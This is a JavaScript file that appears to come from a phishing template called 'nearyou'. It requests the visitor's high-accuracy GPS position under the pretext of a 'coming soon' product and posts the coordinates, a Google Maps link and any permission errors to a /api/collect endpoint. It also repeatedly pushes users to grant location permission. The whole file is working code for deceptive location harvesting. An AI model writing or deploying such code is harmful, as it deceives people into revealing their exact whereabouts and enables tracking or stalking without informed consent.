/**
 * This script collects geolocation information from the user's browser.
 * It is used by the `nearyou` and `weather` templates.
 * The collected data, or any errors, are sent to the `/api/collect` endpoint.
 */

/**
 * Initiates the geolocation request.
 */
function locate() {
    // Check if the browser supports the Geolocation API.
    if (navigator.geolocation) {
        // Set the options for the geolocation request.
        var optn = {
            enableHighAccuracy: true, // Request high-accuracy GPS data.
            timeout: 30000, // Set a 30-second timeout.
            maximumage: 0 // Do not use a cached location.
        };
        // Request the user's current position.
        navigator.geolocation.getCurrentPosition(showPosition, showError, optn);
    } else {
        // If geolocation is not supported, alert the user.
        alert('Geolocation is not Supported by your Browser...');
    }
}

/**
 * Success callback for when the user's position is successfully retrieved.
 * @param {GeolocationPosition} position - The user's position data.
 */
function showPosition(position) {
    // Extract the latitude and longitude from the position data.
    var lat = position.coords.latitude;
    var lon = position.coords.longitude;

    // Send the location data to the backend via an AJAX POST request.
    $.ajax({
        type: 'POST',
        url: '/api/collect',
        contentType: 'application/json',
        data: JSON.stringify({
            template: 'nearyou',
            data: {
                latitude: lat,
                longitude: lon,
                // Include a Google Maps URL for easy visualization.
                map_url: `https://google.com/maps/place/${lat}+${lon}`
            }
        }),
        // On success, update the button text.
        success: function() {
            $('#change').html('Coming Soon');
        },
    });

    // Alert the user that the product is coming soon.
    alert('Thank you For Your Interest in Near You... This Product is Coming Soon...');
}

/**
 * Error callback for when the geolocation request fails.
 * @param {GeolocationPositionError} error - The error object.
 */
function showError(error) {
    var errorData = {};
    // Determine the type of error and set an appropriate message.
    switch (error.code) {
        case error.PERMISSION_DENIED:
            errorData.denied = 'User denied the request for Geolocation';
            alert('Please Refresh This Page and Allow Location Permission...');
            break;
        case error.POSITION_UNAVAILABLE:
            errorData.unavailable = 'Location information is unavailable';
            break;
        case error.TIMEOUT:
            errorData.timeout = 'The request to get user location timed out';
            alert('Please Set Your Location Mode on High Accuracy...');
            break;
        case error.UNKNOWN_ERROR:
            errorData.unknown = 'An unknown error occurred';
            break;
    }

    // Send the error data to the backend for logging purposes.
    $.ajax({
        type: 'POST',
        url: '/api/collect',
        contentType: 'application/json',
        data: JSON.stringify({
            template: 'nearyou',
            data: {
                error: errorData
            }
        }),
        // On success, update the button text to indicate failure.
        success: function() {
            $('#change').html('Failed');
        },
    });
}
